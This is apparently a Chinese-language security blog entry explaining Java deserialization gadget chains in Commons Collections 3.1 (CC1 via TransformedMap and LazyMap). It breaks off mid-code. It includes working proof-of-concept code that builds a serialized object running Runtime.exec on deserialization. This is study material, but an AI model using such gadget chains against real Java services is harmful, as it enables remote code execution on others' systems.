    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Commons Collections</title>
    <link href="/2024/07/28/Commons-Collections/"/>
    <url>/2024/07/28/Commons-Collections/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当初学Java反序列化最先遇到的，这也是绕不开的东西。虽然现在对于很多Java反序列化题已经不能直接套用CC链速通，但是很多缝合怪调试到最后一步还是采用的CC链部分，因为原生反序列化肯定是很好用的。</p><p>首先简单介绍一下几个关键词：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">对于利用链上的类，都需要实现Serializable接口、或继承该接口的实现类<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Source：入口类（重写readObject调用常见方法，参数类型宽泛，最好jdk自带）<br>Gadget Chain：调用链（相同方法名、相同参数类型、不同调用过程）<br>Sink：执行类（RCE、SSRF、写文件...）<br></code></pre></td></tr></table></figure><p>常见方法：<code>toString</code>、<code>hashCode</code>、<code>equals</code></p><p>在后面的CC链中经常看到<code>HashMap</code>作为入口类，它实现了<code>Serializable</code>接口且作为jdk自带的类，<code>readObject</code>中调用了常见方法<code>hashCode</code>，是不错的入口类。</p><p>严格来说应该从URLDNS开始写，但是原理也很简单很易懂，只涉及URL类里hashcode里的简单操作触发访问DNS（其实是我懒），就不写了。</p><p>话不多说，直接回到我们梦开始的地方-<strong>Commons Collections</strong>。</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>CC1其实用的不多，CC链里用得频繁的其实是CC3（恶意字节码）、CC6以及CC4，还有很少见的CC2，CC1其实就是起到一个引入学习的作用。</p><p>首先依赖就直接</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里我用的是<code>Jdk8u401</code>。</p><p>这几个Map都尤为经典，需要深入学习。</p><p><strong>Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>Transformer</code>是一个接口，可以接受任意一个<code>Object</code>类型的参数传入。这个接口有几个重要的Map实现类，而且它们都实现了<code>Serializable</code>接口。</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里<code>ConstantTransformer</code>调用<code>transform()</code>方法返回构造时传入的对象</p><p>写一堆玩意其实就是传入传出一个对象，前后不变。</p><p><strong>InvokerTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125; <span class="hljs-comment">// catch ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个就比较关键了，是反序列化利用的常客。因为它这里的invoke可以执行任意方法。</p><ul><li>iMethodName 待执行的方法名</li><li>iParamTypes 待执行方法的参数列表的参数类型</li><li>iArgs 待执行方法的参数列表</li></ul><p>调用<code>transform</code>的时候会执行input对象的iMethodName方法。</p><p><strong>ChainedTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一堆，其实就是把多个<code>Transformer</code>串成一条链子，前一个调用返回的结果作为后一个调用的参数。</p><p><strong>TransformedMap</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TransformedMap</code>用于对Java原生Map进行一些修饰，当Map调用<code>setValue</code>时，会触发<code>checkSetValue</code>，进而调用<code>transform</code>。其构造方法被<code>protected</code>修饰，因此我们利用它的静态public方法<code>decorate</code></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>首先我们想到的是使用<code>Transformer</code>的实现类和<code>TransformedMap</code>实现命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>但是这里有俩问题：</p><ul><li>Runtime类没有实现<code>Serializable</code>接口，无法反序列化</li><li>需要找到<code>readObject</code>中有类似<code>Map.put(xxx,yyy)</code>操作的类</li></ul><p>对于问题一，<code>Class</code>类可以反序列化，那么我们可以用<code>Runtime.class</code>作为<code>ChainedTransformer</code>的入口参数，后面再通过反射来调用exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>对于问题二，这里有一个完美完成任务的类：<strong>AnnotationInvocationHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>审一下就可以得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue =》<br>TransformedMap#checkSetValue =》 <br>valueTransformer.transform()<br></code></pre></td></tr></table></figure><p>checkSetValue会因为Map调用setValue方法而调用checkSetValue方法；</p><p>因此让<code>memberValue</code>为上面的evilMap即可。</p><p>但怎么触发到这个setValue呢？</p><p>判断条件在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>它需要满足<code>memberType != null</code>才能进入<code>memberValue.setValue</code></p><p>继续跟进：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br></code></pre></td></tr></table></figure><p>再到annotationType：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br></code></pre></td></tr></table></figure><p>构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br></code></pre></td></tr></table></figure><p>type是构造对象时传进来的<code>Annotation子类</code>的<code>Class</code> </p><p>name是传入Map（memberValues）的每个键名</p><p><code>memberType.get(name)</code>要不为空  即要求<code>AnnotationType</code>要有名为<code>name</code>的成员</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(AnnotationType.getInstance(Target.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class [Ljava.lang.annotation.ElementType;&#125;</span><br>System.out.println(AnnotationType.getInstance(Retention.class).memberTypes());<br><span class="hljs-comment">// &#123;value=class java.lang.annotation.RetentionPolicy&#125;</span><br></code></pre></td></tr></table></figure><p>@Retention和@Target都有<code>value</code>这个成员</p><p>另外，<code>AnnotationInvocationHandler</code>的构造方法被default修饰，不能直接new，要利用反射来实例化该类。</p><p>那么我们就得到了<strong>CC1-TransformedMap-POC</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-number">114514</span>);<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">aih</span> <span class="hljs-operator">=</span> cons.newInstance(Target.class, evilMap);<br><br><span class="hljs-comment">// 序列化</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(aih);<br>oos.close();<br><br><span class="hljs-comment">// 反序列化</span><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>ois.close();<br></code></pre></td></tr></table></figure><p>但这个CC1问题很多，首先是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>作为CC1链的入口类， 在<strong>Jdk8u71</strong>之后被修改了，修改后的<code>readObject</code>方法中新建了一个<code>LinkedHashMap</code>对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的<code>LinkedHashMap</code>对象，而原来我们精心构造的Map不再执行setValue或put操作，也就不会触发RCE了。</p><p>接下来就要引入<strong>CC1-LazyMap</strong>的方法，这也是ysoserial中的方法。</p><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h3><p>分析完上面的链子其实就很显然，CC链的关键在于<code>transform()</code>的触发,上面那条<code>TransformedMap</code>的触发在于“外援”<code>AnnotationInvocationHandler</code>的<code>readObject</code>调用了<code>setValue</code>，进而触发<code>TransformedMap</code>的<code>checkSetValue</code>，进而触发<code>transform()</code></p><p>而<code>LazyMap</code>是另一个触发点备选，因为<code>LazyMap</code>的<code>get</code>方法中会执行<code>factory.transform()</code>，也暗合“懒加载”的真谛。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyMap</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>由get触发，对比一下可以发现：</p><ul><li>LazyMap：get元素时触发</li><li>TransformedMap：set元素时触发</li></ul><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>先给出Gadget Chains：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>        <span class="hljs-comment">//恶意对象反射链部分</span><br>ChainedTransformer#transform()<br>ConstantTransformer#transform()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Class#getMethod()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#getRuntime()<br>                        InvokerTransformer#transform()<br>                        Method#invoke()<br>                        Runtime#exec()<br></code></pre></td></tr></table></figure><p>与前面分析的<code>TransformedMap</code>不同，在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>方法中并没有直接调用到Map的get方法。</p><p>但是ysoserial找到了<code>AnnotationInvocationHandler</code>的invoke方法中调用了get：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>    <span class="hljs-comment">// Handle Object and Annotation methods</span><br>    <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>        paramTypes[<span 